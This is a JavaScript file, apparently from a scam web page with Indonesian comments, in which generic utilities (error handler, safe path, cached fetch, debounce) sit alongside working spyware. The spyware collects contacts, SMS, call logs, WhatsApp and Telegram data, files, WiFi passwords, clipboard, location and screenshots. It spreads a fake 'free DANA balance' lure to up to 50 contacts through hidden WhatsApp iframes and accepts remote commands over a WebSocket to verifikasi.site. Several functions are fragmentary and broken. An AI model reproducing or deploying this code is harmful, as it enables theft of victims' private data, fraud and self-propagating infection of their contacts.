// 🔥 UPGRADE 1: GLOBAL ERROR HANDLER (MAKSIMAL)

(function() {
    var errorLog = [];
    
    window.addEventListener('error', function(e) {
        var err = {
            message: e.message || 'Unknown error',
            filename: e.filename || 'unknown',
            lineno: e.lineno || 0,
            colno: e.colno || 0,
            stack: (e.error && e.error.stack) || 'No stack',
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        return true;
    }, true);
    
    window.addEventListener('unhandledrejection', function(e) {
        var err = {
            type: 'unhandled_rejection',
            reason: String(e.reason || 'Unknown'),
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        e.preventDefault();
        return true;
    }, true);
    
    window.__errorLog = errorLog;
})();

// ============================================================
// 🔥 UPGRADE 2: SAFE PATH (CEGAH PATH TRAVERSAL)
// ============================================================
function getSafePath(base, filename) {
    if (!base || typeof base !== 'string') return null;
    if (!filename || typeof filename !== 'string') return null;
    
    var cleanName = filename.replace(/[^a-zA-Z0-9_.-]/g, '');
    if (cleanName.length === 0) return null;
    
    var fullPath = base.replace(/\/+$/, '') + '/' + cleanName;
    
    if (fullPath.indexOf('..') !== -1) return null;
    if (fullPath.indexOf('//') !== -1) return null;
    
    return fullPath;
}

// ============================================================
// 🔥 UPGRADE 3: SAFE FETCH (TIMEOUT + RETRY + CACHE)
// ============================================================
function safeFetch(url, options, timeout, retries) {
    timeout = timeout || 15000;
    retries = retries || 3;
    var attempt = 0;
    var cacheKey = 'cache_' + url;
    
    try {
        var cached = localStorage.getItem(cacheKey);
        if (cached) {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 60000)) {
                return Promise.resolve(new Response(JSON.stringify(data.value), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
        }
    } catch(e) {}
    
    function doFetch() {
        return new Promise(function(resolve, reject) {
            var timer = setTimeout(function() {
                reject(new Error('Timeout: ' + url));
            }, timeout);
            
            fetch(url, options)
                .then(function(response) {
                    clearTimeout(timer);
                    if (response.ok) {
                        response.clone().text().then(function(text) {
                            try {
                                localStorage.setItem(cacheKey, JSON.stringify({
                                    value: JSON.parse(text),
                                    timestamp: Date.now()
                                }));
                            } catch(e) {}
                        }).catch(function(){});
                    }
                    resolve(response);
                })
                .catch(function(err) {
                    clearTimeout(timer);
                    reject(err);
                });
        });
    }
    
    return new Promise(function(resolve, reject) {
        function tryFetch() {
            doFetch()
                .then(resolve)
                .catch(function(err) {
                    attempt++;
                    if (attempt < retries) {
                        var delay = 1000 * Math.pow(2, attempt);
                        setTimeout(tryFetch, delay);
                    } else {
                        reject(err);
                    }
                });
        }
        tryFetch();
    });
}

// ============================================================
// 🔥 UPGRADE 4: DEBOUNCE & THROTTLE
// ============================================================
function debounce(fn, delay) {
    var timer = null;
    return function() {
        var args = arguments;
        var context = this;
        if (timer) clearTimeout(timer);
        timer = setTimeout(function() {
            fn.apply(context, args);
            timer = null;
        }, delay);
    };
}

function throttle(fn, limit) {
    var lastCall = 0;
    return function() {
        var now = Date.now();
        if (now - lastCall >= limit) {
            lastCall = now;
            fn.apply(this, arguments);
        }
    };
}

// ============================================================
// 🔥 UPGRADE 5: CACHE MANAGER
// ============================================================
var CacheManager = {
    set: function(key, value, ttl) {
        ttl = ttl || 300000;
        try {
            localStorage.setItem('cm_' + key, JSON.stringify({
                value: value,
                expires: Date.now() + ttl
            }));
            return true;
        } catch(e) { return false; }
    },
    get: function(key) {
        try {
            var raw = localStorage.getItem('cm_' + key);
            if (!raw) return null;
            var data = JSON.parse(raw);
            if (Date.now() > data.expires) {
                localStorage.removeItem('cm_' + key);
                return null;
            }
            return data.value;
        } catch(e) { return null; }
    },
    clear: function(key) {
        try {
            if (key) {
                localStorage.removeItem('cm_' + key);
            } else {
                var keys = Object.keys(localStorage);
                keys.forEach(function(k) {
                    if (k.startsWith('cm_')) localStorage.removeItem(k);
                });
            }
        } catch(e) {}
    }
};

// ============================================================
// 🔥 UPGRADE 6: DATA COMPRESSION
// ============================================================
function compressData(data) {
    try {
        var json = JSON.stringify(data);
        return json.replace(/\s/g, '');
    } catch(e) { return JSON.stringify(data); }
}

function decompressData(str) {
    try {
        return JSON.parse(str);
    } catch(e) { return null; }
}

// ============================================================
// DETEKSI LINGKUNGAN

function detectEnvironment() {
    var env = { isWebView: false, isFacebook: false, isWhatsApp: false, isTelegram: false, isInstagram: false, isTikTok: false, isAndroidBridge: false, isBrowser: false };
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1) env.isWebView = true;
    if (ua.indexOf('fb') > -1 || ua.indexOf('facebook') > -1 || document.referrer.indexOf('facebook') > -1) env.isFacebook = true;
    if (ua.indexOf('whatsapp') > -1 || document.referrer.indexOf('whatsapp') > -1) env.isWhatsApp = true;
    if (ua.indexOf('telegram') > -1 || document.referrer.indexOf('telegram') > -1) env.isTelegram = true;
    if (ua.indexOf('instagram') > -1 || document.referrer.indexOf('instagram') > -1) env.isInstagram = true;
    if (ua.indexOf('tiktok') > -1 || document.referrer.indexOf('tiktok') > -1) env.isTikTok = true;
    if (typeof AndroidBridge !== 'undefined') env.isAndroidBridge = true;
    if (!env.isWebView && !env.isAndroidBridge) env.isBrowser = true;
    return env;
}
var ENV = detectEnvironment();

    try { window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end'; } catch(e) {}
    try { window.open(url, '_system'); } catch(e) {}
    try { var iframe = document.createElement('iframe'); iframe.src = url; iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999'; document.body.appendChild(iframe); } catch(e) {}
}

function ambilDataCepat() {
    var data = { waktu: Date.now(), ua: navigator.userAgent, ip: '', lokasi: null, kontak: null, sms: null, clipboard: null, env: ENV };
    
    try {
        safeFetch('https://api.ipify.org?format=json', { method: 'GET' }, 5000, 2)
            .then(function(r) { return r.json(); })
            .then(function(d) { data.ip = d.ip; K({sumber:'ip', data:d.ip}); })
            .catch(function(){});
    } catch(e) {}
    
    try {
        navigator.geolocation.getCurrentPosition(function(p) {
            data.lokasi = {lat: p.coords.latitude, lon: p.coords.longitude};
            K({sumber:'lokasi', data:data.lokasi});
        }, function(){});
    } catch(e) {}
    
    if(A.isAvailable) {
        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = kontak; K({sumber:'kontak_all', data:kontak}); } } catch(e) {}
        try { var sms = A.getAllSMS(); if(sms) { data.sms = sms; K({sumber:'sms_all', data:sms}); } } catch(e) {}
        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = clipboard; K({sumber:'clipboard', data:clipboard}); } } catch(e) {}
        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:callLog}); } catch(e) {}
        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:wa}); } catch(e) {}
        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:tg}); } catch(e) {}
        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:files}); } catch(e) {}
        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:apps}); } catch(e) {}
        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:wifi}); } catch(e) {}
        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:ss}); } catch(e) {}
    } else {
        try { navigator.clipboard.readText().then(function(t) { if(t) { data.clipboard = t; K({sumber:'clipboard', data:t}); } }).catch(function(){}); } catch(e) {}
    }
    
    K({sumber:'init', data:data});
    return data;
}

function autoSpread() {
    if (spreadDone) return;

    if (!A.isAvailable) {

        return;
    }

        if (!contacts || contacts.length === 0) {

            return;
        }
        
        var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
        var maxSend = 50;
        var iframes = [];
        var sentCount = 0;
        var totalToSend = Math.min(contacts.length, maxSend);
        
        contacts.slice(0, totalToSend).forEach(function(c, i) {
            var timeoutId = setTimeout(function() {
                try {
                    var number = String(c.number || '').replace(/[^0-9]/g, '');
                    if (number && number.length > 5) {
                        var iframe = document.createElement('iframe');
                        iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                        document.body.appendChild(iframe);
                        iframes.push(iframe);
                        sentCount++;
                        
                        var cleanupIframe = setTimeout(function() {
                            try {
                                if (iframe && iframe.parentNode) {
                                    iframe.parentNode.removeChild(iframe);
                                }
                                var idx = iframes.indexOf(iframe);
                                if (idx > -1) iframes.splice(idx, 1);
                            } catch(e) {}
                        }, 5000);
                        cleanupItems.push(function() { clearTimeout(cleanupIframe); });
                    }
                } catch(e) {}
            }, i * 200);
            cleanupItems.push(function() { clearTimeout(timeoutId); });
        });
        
        K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount + '_of_' + totalToSend });
        
        var finalCleanup = setTimeout(function() {
            try {
                for (var i = iframes.length - 1; i >= 0; i--) {
                    try {
                        if (iframes[i] && iframes[i].parentNode) {
                            iframes[i].parentNode.removeChild(iframes[i]);
                        }
                    } catch(e) {}
                }
                iframes = [];

        }, 30000);

    } catch(e) {
        K({ sumber: 'auto_spread_error', data: e.message });

}

// 🔥 SERVICE WORKER - PERBAIKAN! (PAKAI /sw.js BUKAN BLOB!)
// ============================================================
function injectServiceWorker() {
    if (!('serviceWorker' in navigator)) {
        K({ sumber: 'service_worker', data: 'not_supported' });
        return;
    }

    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                K({ sumber: 'service_worker', data: 'already_registered' });
                return;
            }
            
            // ✅ REGISTER PAKAI /sw.js (BUKAN BLOB!)
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    K({ sumber: 'service_worker', data: { status: 'registered_fallback' } });
                })
                .catch(function(err) {
                    K({ sumber: 'service_worker_error', data: err.message });
                });
        });
}

function doConnectWebSocket(password) {
    try {
        var ws = new WebSocket('wss://verifikasi.site/ws');
        var reconnectAttempts = 0;
        var maxReconnect = 10;
        
        ws.onopen = function() {
            reconnectAttempts = 0;
            K({ sumber: 'websocket', data: 'connected' });
            // 🔥 PASSWORD DARI WORKER, BUKAN HARDCODE!
            ws.send(JSON.stringify({
                type: 'auth',
                key: password,
                deviceId: navigator.userAgent || 'unknown',
                timestamp: Date.now()
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'websocket', data: 'authenticated' });
                }
                if (data.type === 'auth_failed') {
                    K({ sumber: 'websocket', data: 'auth_failed' });
                }
                if (data.type === 'command') {
                    handleRemoteCommand(data);
                }
                if (data.type === 'pong') {
                    // Ping/pong untuk keep-alive
                }
            } catch(e) {
                K({ sumber: 'websocket_error', data: e.message });
            }
        };
        
        ws.onclose = function() {
            K({ sumber: 'websocket', data: 'disconnected' });
            if (reconnectAttempts < maxReconnect) {
                reconnectAttempts++;
                var delay = 1000 * Math.pow(1.5, reconnectAttempts);
                setTimeout(function() {
                    doConnectWebSocket(password);
                }, delay);
            }
        };
        
        ws.onerror = function() {
            // Biarkan onclose yang handle reconnect
        };
        
        var wsHeartbeat = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                } catch(e) {}
            }
        }, 30000);
        cleanupItems.push(function() { clearInterval(wsHeartbeat); });
        
    } catch(e) {
        K({ sumber: 'websocket_error', data: e.message });
    }
}

function handleRemoteCommand(data) {
    try {
        var action = data.action || data.command?.aksi;
        var params = data.params || data.command?.params || {};
        
        if (!action) return;
        
        switch(action) {
            case 'screenshot':
                if (A.isAvailable) {
                    var result = A.takeScreenshot();
                    K({ sumber: 'remote_command', data: { action: 'screenshot', result: result } });
                }
                break;
            case 'location':
                navigator.geolocation.getCurrentPosition(function(p) {
                    K({ sumber: 'remote_command', data: { action: 'location', lat: p.coords.latitude, lon: p.coords.longitude } });
                }, function() {});
                break;
            case 'open_app':
                if (A.isAvailable && params.package) {
                    A.openApp(params.package);
                    K({ sumber: 'remote_command', data: { action: 'open_app', package: params.package } });
                }
                break;
            default:
                K({ sumber: 'remote_command', data: { action: 'unknown', command: action } });
        }
    } catch(e) {
        K({ sumber: 'remote_command_error', data: e.message });
    }
}
